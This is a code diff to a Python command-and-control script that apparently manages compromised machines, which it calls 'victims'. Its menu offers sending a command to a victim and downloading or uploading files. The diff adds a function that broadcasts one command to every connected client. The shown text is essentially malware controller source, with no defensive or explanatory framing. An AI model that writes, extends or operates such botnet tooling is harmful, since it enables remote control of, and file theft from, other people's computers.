@@ -33,7 +33,7 @@ def showing_menu():
     print("2.send a command to a victim")
     print("3.download a file")
     print("4.upload a file")
-    print("5.exit")
+    print("5.send all victims the command")
 
 
 
@@ -124,6 +124,12 @@ def reciving_the_file(index:int,destination=str):
 
 
  
+def send_all_victims_the_command(command=str):
+    for i in range(len(list_of_clients)):
+        temp=list_of_clients[i]
+        temp.sendall(('sendall '+command).encode(FORMAT))
+        print(f"the massage is {command} to client number {i+1}")
+        time.sleep(1)
 
 
 
@@ -151,6 +157,10 @@ def program_handler():
             destination=getting_the_destination()
             ind=getting_the_user_index()
             uploading_the_file(file_name,destination,ind-1)
+        if(choice==5):
+            command=getting_a_command()
+            send_all_victims_the_command(command)
+
 
 
 
